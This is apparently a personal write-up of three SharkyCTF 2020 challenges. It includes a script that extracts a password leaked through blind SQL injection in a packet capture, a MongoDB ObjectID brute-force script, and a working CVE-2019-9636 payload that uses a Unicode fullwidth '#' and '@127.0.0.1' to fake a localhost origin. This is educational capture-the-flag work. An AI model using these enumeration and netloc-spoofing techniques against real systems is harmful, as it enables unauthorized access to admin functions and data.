# SharkyCTF 2020
I basically didn't work on this CTF much and spent my time doing other stuff :).

RGBsec got ~~3rd~~ 4th my b.


## Pain in the ass
> It looks like someone dumped our database. Please help us know what has been leaked ...
>
> Attached: pain-in-the-ass.pcapng

After waiting a while for the whole 26 MB of pcapng glory to download, we open the packets in WireShark.

It seems someone has been running a blind SQLi, and extracting the password of a user called `d4rk2phi`.

We can dump everything related to `d4rk2phi` with `strings pain-in-the-ass.pcapng > dump.txt`.

After that, we just have to match the char number and char in the blind SQLi:

```python
import re

f = open("dump.txt").readlines()

offset_regex = r"OFFSET\s\d\),(\d+)"
char_regex = r"=\s\'(.)\'"

pw = [""]*80

for i in f:
    try:
        offset = int(re.search(offset_regex, i).group(1))

        char = re.search(char_regex, i).group(1)

        pw[offset] = char
        
    except:
        pass

print(''.join(pw))
# hkCTF{4lm0st_h1dd3n_3xtr4ct10n_0e18e336adc8236a0452cd570f74542}
# IDK why the first character isn't there
```

Flag: `shkCTF{4lm0st_h1dd3n_3xtr4ct10n_0e18e336adc8236a0452cd570f74542}`


## Containment 
>Hello, welcome on "Containment Forever"! There are 2 categories of posts, only the first is available, get access to the posts on the flag category to retrieve the flag.
>
>containment-forever.sharkyctf.xyz

We are given some entries in a database, with namely their ObjectID. This reminded me of an [ACTF2018 challenge](https://www.pwndiary.com/write-ups/angstrom-ctf-2018-the-best-website-write-up-web230/). It's the same solve :).

```python
import requests

url = "http://containment-forever.sharkyctf.xyz/item/"

t1 = "5e75dab2"
t2 = "5e948a3a"
mid = "d7b160"
pid = "0013"
c = 0x655bb5

for i in range(200):
    offset = hex(c+i)[2:]

    p = requests.get(url + t1 + mid + pid + offset)
    if p.ok:
        print(url + t1 + mid + pid + offset)
        break


for i in range(200):
    offset = hex(c+i)[2:]

    p = requests.get(url + t2 + mid + pid + offset)
    if p.ok:
        print(url + t2 + mid + pid + offset)
        break
```


## Aqua world
>My friend opened this handmade aquarium blog recently and told me some strangers connected to his admin panel and he doesn't understand how it is possible.. I'm asking you to get the answer!
>
>http://aquaworld.sharkyctf.xyz/
>
>Hint: WTF this PYTHON version is deprecated!!!

From the hint we can probably assume it's going to be a "find-the-CVE" type problem.

Inspecting response headers from the page reveals the server is using `Werkzeug/1.0.1 Python/3.7.2`.

After hitting the cool green `Log in anonymously` button, we decide to visit the grayed out "Admin" link through inspect element.

![](https://i.imgur.com/fAMWkoV.png)

which takes us to `/admin-query?flag=flag`:

> Hi anonymous You need to connect locally in order to access the admin section (and get the flag) but you current netlocation (netloc) is http://aquaworld.sharkyctf.xyz

We need to somehow get the server to think that we were accessing from localhost.

My first reaction was to somehow SSRF, but there was no attack surface for that.

Going back to the hint, we search for [Python 3.7.2 CVEs](https://www.cvedetails.com/vulnerability-list/vendor_id-10210/product_id-18230/version_id-285731/Python-Python-3.7.2.html).

[CVE-2019-9636](https://www.cvedetails.com/cve/CVE-2019-9636/) jumps out immediately, as it has the word `netloc` in the description.

We can implement an attack following this thread: [https://bugs.python.org/issue36216](https://bugs.python.org/issue36216).

It's important to use a version of Python <= 3.7.2 for the solve script, which still has the bug.

I got stuck here for a while, trying every combination of the attack with the url. Eventually bAse figures out you have to put the unicode+@+localhost at the end of the ENDPOINT, not at the end of the netloc or anywhere else.

Also, keep the `Authorization` header unless you want a 403.

```python
import requests

headers = {
    "Authorization":"Basic YW5vbnltb3VzOmFub255bW91cw=="
}

p = requests.get("http://aquaworld.sharkyctf.xyz/admin-query\uFF03@127.0.0.1?flag=flag", headers=headers)
print(p.text)
```

Flag: `shkCTF{NFKC_normalization_can_be_dangerous!_8471b9b2da83011a07efc2899819da65}`.
